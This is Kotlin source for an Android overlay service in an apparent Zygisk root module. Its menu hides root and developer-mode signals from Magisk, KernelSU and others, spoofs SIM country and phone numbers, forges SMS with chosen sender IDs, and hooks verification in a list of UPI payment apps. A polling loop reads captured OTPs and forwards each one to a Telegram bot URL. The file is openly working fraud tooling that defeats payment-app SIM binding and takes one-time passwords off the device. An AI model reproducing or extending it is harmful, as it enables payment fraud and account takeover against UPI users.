package com.hivirtus.zygiskmode

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.view.Gravity
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.android.material.switchmaterial.SwitchMaterial
import com.hivirtus.zygiskmode.databinding.OverlayMenuBinding
import com.hivirtus.zygiskmode.databinding.OverlayRootBinding
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class OverlayService : Service() {

    private lateinit var windowManager: WindowManager
    private lateinit var rootBinding: OverlayRootBinding
    private lateinit var menuBinding: OverlayMenuBinding
    private lateinit var layoutParams: WindowManager.LayoutParams

    private val configManager by lazy { ConfigManager(this) }
    private val tokenForwarder by lazy { TokenForwarder(configManager) }
    private var pollJob: Job? = null
    private var menuExpanded = false
    private var lastForwardedKey: String? = null
    private val upiAppSwitches = mutableMapOf<String, SwitchMaterial>()

    private var initialX = 0
    private var initialY = 0
    private var initialTouchX = 0f
    private var initialTouchY = 0f
    private var isDragging = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(NOTIFICATION_ID, createNotification())
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        showOverlay()
        startOtpPolling()
    }

    override fun onDestroy() {
        pollJob?.cancel()
        try {
            windowManager.removeView(rootBinding.root)
        } catch (_: Exception) {}
        super.onDestroy()
    }

    private fun showOverlay() {
        rootBinding = OverlayRootBinding.inflate(LayoutInflater.from(this))
        menuBinding = rootBinding.menuPanel

        setupMenu()
        setupBubble()

        layoutParams = WindowManager.LayoutParams(
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            overlayType(),
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 50
            y = 200
        }

        windowManager.addView(rootBinding.root, layoutParams)
        collapseMenu()
    }

    private fun setupBubble() {
        rootBinding.floatingBubble.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    initialX = layoutParams.x
                    initialY = layoutParams.y
                    initialTouchX = event.rawX
                    initialTouchY = event.rawY
                    isDragging = false
                    true
                }
                MotionEvent.ACTION_MOVE -> {
                    val dx = (event.rawX - initialTouchX).toInt()
                    val dy = (event.rawY - initialTouchY).toInt()
                    if (dx * dx + dy * dy > 25) isDragging = true
                    layoutParams.x = initialX + dx
                    layoutParams.y = initialY + dy
                    windowManager.updateViewLayout(rootBinding.root, layoutParams)
                    true
                }
                MotionEvent.ACTION_UP -> {
                    if (!isDragging && !menuExpanded) expandMenu()
                    true
                }
                else -> false
            }
        }
    }

    private fun setupMenu() {
        val config = configManager.load()

        menuBinding.switchSim1Mock.isChecked = config.enableSim1Mock
        menuBinding.switchSim2Mock.isChecked = config.enableSim2Mock
        menuBinding.etCountryIso.setText(config.mockCountryIso)
        menuBinding.switchHideMagisk.isChecked = config.hideMagisk
        menuBinding.switchHideKernelSu.isChecked = config.hideKernelSu
        menuBinding.switchHideApatch.isChecked = config.hideApatch
        menuBinding.switchHideSukisu.isChecked = config.hideSukisu
        menuBinding.switchHideAllRootApps.isChecked = config.hideAllRootApps
        menuBinding.switchNotDeveloper.isChecked = config.hideDeveloper
        menuBinding.switchNotRoot.isChecked = config.hideRoot
        menuBinding.switchPhoneSpoof.isChecked = config.enablePhoneSpoof
        menuBinding.etPhoneSim1.setText(config.mockPhoneSim1)
        menuBinding.etPhoneSim2.setText(config.mockPhoneSim2)
        menuBinding.tvRootType.text = getString(R.string.detected_root, configManager.readRootType())
        menuBinding.switchHookIncoming.isChecked = config.hookIncomingSms
        menuBinding.switchHookOutgoing.isChecked = config.hookOutgoingSms
        menuBinding.etSenderId.setText(config.injectSenderId)
        menuBinding.etMessageBody.setText(config.injectMessageBody)
        menuBinding.switchAutoForward.isChecked = config.autoForwardToken
        menuBinding.etBotToken.setText(config.telegramBotToken)
        menuBinding.etChatId.setText(config.telegramChatId)

        menuBinding.btnClose.setOnClickListener { stopSelf() }
        menuBinding.btnMinimize.setOnClickListener { collapseMenu() }

        menuBinding.tabSystem.setOnClickListener { selectTab(Tab.SYSTEM) }
        menuBinding.tabUpi.setOnClickListener { selectTab(Tab.UPI) }
        menuBinding.tabMessage.setOnClickListener { selectTab(Tab.MESSAGE) }
        menuBinding.tabTelegram.setOnClickListener { selectTab(Tab.TELEGRAM) }

        setupUpiApps(config)

        menuBinding.btnSaveSim.setOnClickListener {
            val updated = configManager.load().copy(
                enableSim1Mock = menuBinding.switchSim1Mock.isChecked,
                enableSim2Mock = menuBinding.switchSim2Mock.isChecked,
                mockCountryIso = menuBinding.etCountryIso.text?.toString()?.lowercase()?.ifBlank { "in" } ?: "in",
                hideMagisk = menuBinding.switchHideMagisk.isChecked,
                hideKernelSu = menuBinding.switchHideKernelSu.isChecked,
                hideApatch = menuBinding.switchHideApatch.isChecked,
                hideSukisu = menuBinding.switchHideSukisu.isChecked,
                hideAllRootApps = menuBinding.switchHideAllRootApps.isChecked,
                hideDeveloper = menuBinding.switchNotDeveloper.isChecked,
                hideRoot = menuBinding.switchNotRoot.isChecked,
                enablePhoneSpoof = menuBinding.switchPhoneSpoof.isChecked,
                mockPhoneSim1 = menuBinding.etPhoneSim1.text?.toString()?.ifBlank { "+919876543210" } ?: "+919876543210",
                mockPhoneSim2 = menuBinding.etPhoneSim2.text?.toString()?.ifBlank { "+919876543211" } ?: "+919876543211"
            )
            configManager.save(updated)
            Toast.makeText(this, R.string.sim_settings_saved, Toast.LENGTH_SHORT).show()
        }

        menuBinding.btnInjectSms.setOnClickListener {
            val sender = menuBinding.etSenderId.text?.toString()?.ifBlank { "AD-TEST-S" } ?: "AD-TEST-S"
            val body = menuBinding.etMessageBody.text?.toString().orEmpty()
            if (body.isBlank()) {
                Toast.makeText(this, R.string.enter_message_body, Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            configManager.update {
                it.copy(
                    injectSenderId = sender,
                    injectMessageBody = body,
                    hookIncomingSms = menuBinding.switchHookIncoming.isChecked,
                    hookOutgoingSms = menuBinding.switchHookOutgoing.isChecked
                )
            }
            configManager.writeInjectCommand(sender, body)
            Toast.makeText(this, R.string.sms_injected, Toast.LENGTH_SHORT).show()
        }

        menuBinding.btnSaveTelegram.setOnClickListener {
            val token = menuBinding.etBotToken.text?.toString().orEmpty()
            val chatId = menuBinding.etChatId.text?.toString().orEmpty()
            val forwardUrl = if (token.isNotBlank() && chatId.isNotBlank()) {
                "https://api.telegram.org/bot$token/sendMessage"
            } else {
                configManager.load().forwardUrl
            }
            configManager.update {
                it.copy(
                    autoForwardToken = menuBinding.switchAutoForward.isChecked,
                    telegramBotToken = token,
                    telegramChatId = chatId,
                    forwardUrl = forwardUrl
                )
            }
            Toast.makeText(this, R.string.config_saved, Toast.LENGTH_SHORT).show()
        }

        menuBinding.btnTestTelegram.setOnClickListener {
            CoroutineScope(Dispatchers.IO).launch {
                val ok = tokenForwarder.sendTestMessage()
                launch(Dispatchers.Main) {
                    Toast.makeText(
                        this@OverlayService,
                        if (ok) R.string.telegram_test_sent else R.string.telegram_test_failed,
                        Toast.LENGTH_SHORT
                    ).show()
                }
            }
        }

        menuBinding.btnSelectAllUpi.setOnClickListener {
            upiAppSwitches.values.forEach { it.isChecked = true }
        }

        menuBinding.btnDeselectAllUpi.setOnClickListener {
            upiAppSwitches.values.forEach { it.isChecked = false }
        }

        menuBinding.btnSaveUpiHooks.setOnClickListener {
            val hooked = upiAppSwitches.mapValues { it.value.isChecked }
            configManager.update {
                it.copy(
                    hookUpiVerification = menuBinding.switchHookUpiVerification.isChecked,
                    hookedUpiApps = hooked
                )
            }
            Toast.makeText(this, R.string.upi_hooks_saved, Toast.LENGTH_SHORT).show()
        }

        selectTab(Tab.UPI)
    }

    private fun setupUpiApps(config: ModuleConfig) {
        menuBinding.switchHookUpiVerification.isChecked = config.hookUpiVerification
        menuBinding.upiAppsContainer.removeAllViews()
        upiAppSwitches.clear()

        UpiAppRegistry.ALL.forEach { app ->
            val switch = SwitchMaterial(this).apply {
                text = app.displayName
                isChecked = config.hookedUpiApps[app.packageName] ?: true
                setTextColor(ContextCompat.getColor(this@OverlayService, R.color.text_primary))
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
            }
            upiAppSwitches[app.packageName] = switch
            menuBinding.upiAppsContainer.addView(switch)
        }
    }

    private fun expandMenu() {
        menuExpanded = true
        rootBinding.floatingBubble.visibility = View.GONE
        rootBinding.menuPanel.visibility = View.VISIBLE
        layoutParams.flags = layoutParams.flags and WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()
        windowManager.updateViewLayout(rootBinding.root, layoutParams)
    }

    private fun collapseMenu() {
        menuExpanded = false
        rootBinding.menuPanel.visibility = View.GONE
        rootBinding.floatingBubble.visibility = View.VISIBLE
        layoutParams.flags = layoutParams.flags or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        windowManager.updateViewLayout(rootBinding.root, layoutParams)
    }

    private enum class Tab { SYSTEM, UPI, MESSAGE, TELEGRAM }

    private fun selectTab(tab: Tab) {
        menuBinding.panelSystem.visibility = if (tab == Tab.SYSTEM) View.VISIBLE else View.GONE
        menuBinding.panelUpi.visibility = if (tab == Tab.UPI) View.VISIBLE else View.GONE
        menuBinding.panelMessage.visibility = if (tab == Tab.MESSAGE) View.VISIBLE else View.GONE
        menuBinding.panelTelegram.visibility = if (tab == Tab.TELEGRAM) View.VISIBLE else View.GONE

        val active = getColor(R.color.tab_active)
        val inactive = getColor(R.color.tab_inactive)

        listOf(
            menuBinding.tabSystem to Tab.SYSTEM,
            menuBinding.tabUpi to Tab.UPI,
            menuBinding.tabMessage to Tab.MESSAGE,
            menuBinding.tabTelegram to Tab.TELEGRAM
        ).forEach { (view, t) ->
            view.isSelected = tab == t
            view.setTextColor(if (tab == t) active else inactive)
        }
    }

    private fun startOtpPolling() {
        pollJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                val lastOtp = configManager.readLastOtp()
                if (lastOtp != null) {
                    val forwardKey = "${lastOtp.sender}|${lastOtp.body}|${lastOtp.otp}"
                    if (forwardKey != lastForwardedKey && tokenForwarder.forward(lastOtp)) {
                        lastForwardedKey = forwardKey
                        launch(Dispatchers.Main) {
                            menuBinding.tvLastOtp.visibility = View.VISIBLE
                            menuBinding.tvLastOtp.text = getString(
                                R.string.last_otp_format,
                                lastOtp.otp,
                                lastOtp.sender
                            )
                        }
                    }
                }
                delay(3000)
            }
        }
    }

    private fun overlayType(): Int {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_PHONE
        }
    }

    private fun createNotification(): Notification {
        val channelId = "hivirtus_zygisk_mode"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                getString(R.string.notification_channel),
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(getString(R.string.app_name))
            .setContentText(getString(R.string.overlay_running))
            .setSmallIcon(R.drawable.ic_notification)
            .setOngoing(true)
            .build()
    }

    companion object {
        private const val NOTIFICATION_ID = 2001
    }
}
